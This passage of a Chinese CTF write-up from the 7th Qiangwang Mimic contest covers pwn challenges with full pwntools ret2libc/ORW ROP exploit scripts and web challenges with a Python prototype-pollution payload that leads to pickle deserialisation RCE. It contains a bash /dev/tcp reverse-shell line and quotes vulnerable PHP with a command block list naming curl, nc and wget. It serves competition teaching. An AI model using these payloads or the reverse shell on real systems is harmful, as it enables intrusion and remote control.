---
title: 第七届强网拟态 writeup by Mini-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511037&idx=1&sn=3fe50aa8e2df76d4bddea0b592f5b072&chksm=e89d8325dfea0a338fea58698e63eaf46539ffaf5b77e2c99b5b174f873f4e5c38f824574d8c&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-10-23
fetch_date: 2025-10-06T18:51:53.821284
---

# 第七届强网拟态 writeup by Mini-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBSDoMPRzibz0Libdu0NLLM4pgg5379sHtlehtOW2VZncYfAfzzeILzicicbejYWFtsSY79V0RG2K6LgfQ/0?wx_fmt=jpeg)

# 第七届强网拟态 writeup by Mini-Venom

原创

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## Pwn

### signin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSDoMPRzibz0Libdu0NLLM4pgUUl6D5zMKIwR9TTHnHSP52LadXYd3IHLeiboHon7ZoFe3SSicEF8mNZw/640?wx_fmt=png&from=appmsg)

这个函数纯在栈溢出，打ret2libc\_orw即可

```
from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./vuln')
p=remote("pwn-0a25f7a133.challenge.xctf.org.cn", 9999, ssl=True)
elf = ELF('./vuln')
libc = ELF('libc.so.6')
#gdb.attach(p,'b *0x4014b1')
s(b'a'*0x12)
from ctypes import *
cdll=CDLL('libc.so.6')
cdll.srand(1633771873)

for i in range(100):
        sa('Input the authentication code:\n',p64(cdll.rand()%100+1))

pop_rdi = 0x0000000000401893
ret = 0x000000000040101a

#debug('b *0x4012a0')
#p.interactive()
#gdb.attach(p,'b *0x4013c0')
sa(b'>> \n',p32(1))
sa(b'Index: ',p32(1))
sa(b'Note: ',b'a'*8)

pause()

s(b'a'*0x100+p64(0x404000+0x100) + p64(pop_rdi) + p64(elf.got['read']) + p64(elf.sym["puts"]) + p64(0x4013C0))
pause()
p.recv(1)
libc_base = uu64()-libc.sym["read"]
system, binsh = get_sb()
lg('libc_base',libc_base)

pause()
rax = libc_base + 0x0000000000036174
syscall = libc_base + next(libc.search(asm('syscall; ret;')))
rdi = libc_base + 0x0000000000023b6a
rsi = libc_base +0x000000000002601f
rdx_r12 = libc_base +0x0000000000119211
mprotect = libc_base + libc.sym['mprotect']
open_ = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
buf = 0x4040D0
flag = 0x4042a0

payload = b'b'*0x108

# write flag

payload += p64(rdx_r12)+p64(0x300)+p64(0) + p64(read)
print(hex(len(payload)))
r()
s(payload)

pause()
payload = b'a'*0x128
# read flag -> buf
payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(8)*2 + p64(read)
# open flag
payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)
# read flag
payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)
# write flag
payload += p64(rdi) + p64(1) + p64(write)

s(payload)
pause()
sleep(1)
s(b'/flag')
pause()
#pause()
inter()
```

### challenge

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
pr = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote()
#p = process('./pwn')

rdi=0x0000000000401393
rl("lets move and pwn!")
payload=b'a'*(0x100+8)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4012F0)
#bug()
s(payload)

libc_base=get_addr64()-libc.sym['puts']
pr(hex(libc_base))

rdi = libc_base+0x0000000000023b6a
rsi = libc_base+0x000000000002601f
rdx = libc_base+0x0000000000142c92
rdx_r12=libc_base+0x0000000000119211
rax = libc_base+0x0000000000036174
ret = libc_base+0x0000000000022679
syscall=libc_base+0x000000000002284d
open_=libc_base+libc.sym['open']
read=libc_base + libc.sym['read']
write=libc_base + libc.sym['write']
mprotect=libc_base + libc.sym['mprotect']
bss=0x404060+0x500
rl("lets move and pwn!")
payload=b'a'*(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x4012EE)
#bug()
s(payload)
pause()
orw  = b'/flag\x00\x00\x00'
orw += p64(rdi) + p64(bss)  #/flag的字符串位置，要改
orw += p64(rsi) + p64(0)
orw += p64(open_)

orw += p64(rdi) + p64(3)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(bss+0x200) #读入flag的位置
orw += p64(read)
orw += p64(rdi) + p64(1)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(rsi)+p64(bss+0x200) #读入flag的位置
orw += p64(write)

pr(hex(len(orw)))
s(orw)

inter()
```

## Web

### ez\_pickle

审计源码发现就是需要 amdin 才能上传文件，在/register 存在原型链污染，污染 key 进行 jwt 伪造

```
{"__init__":{"__globals__":{"secret_key":"111"}}}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSDoMPRzibz0Libdu0NLLM4pgYuZIBNUEnsGYicVSmgIZEzZzDY0PbbiccKmaltiaxF7ia1B7XAeQhMhsdw/640?wx_fmt=png&from=appmsg)

然后发现 pickle 反序列化存在 findclass 的 waf，通过污染白名单进行绕过

```
{
    "__init__" : {
        "__globals__" : {
            "safe_names" :["getattr","system","dict","globals"]
        }
    }
}

{
    "__init__" : {
        "__globals__" : {
            "safe_modules" : "builtins"
        }
    }
}
```

```
# 给定的字节数据
a='''cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1
cbuiltins
getattr
(g1
S'eval'
tR(S'__import__("os").system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'")'
tR.'''.encode()

# 文件名
filename = '111.pkl'

# 打开文件并以二进制写入模式写入字节
with open(filename, 'wb') as f:
    f.write(a)

print(f"字节数据已成功写入到文件: {filename}")
```

最后上传文件反弹 shell 得到flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBSDoMPRzibz0Libdu0NLLM4pgGsLMktJs3X8I2xNd5lhHSuhRcSdztjBUp3HMzqt8hicdJvClToEq8icw/640?wx_fmt=png&from=appmsg)

### capoo

源码：

```
##showpic.php源码
<?php
class CapooObj {
    public function __wakeup()
    {
        $action = $this->action;
        $action = str_replace("\"", "", $action);
        $action = str_replace("\'", "", $action);
        $banlist = "/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|\~|\`|\r|\n|\t|\        |\^|ls|\.|tail|watch|wget|\||\;|\:|\(|\)|\{|\}|\*|\?|\[|\]|\@|\\|\=|\<)/i";
        if(preg_match($banlist, $action)){
                die("Not Allowed!");
        }
        system($this->action);
    }
}
header("Content-type:text/html;charset=utf-8");
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
    $file = $_POST['capoo'];

    if (file_exists($file)) {
        $data = file_get_contents($file);
        $base64 = base64_encode($data);
...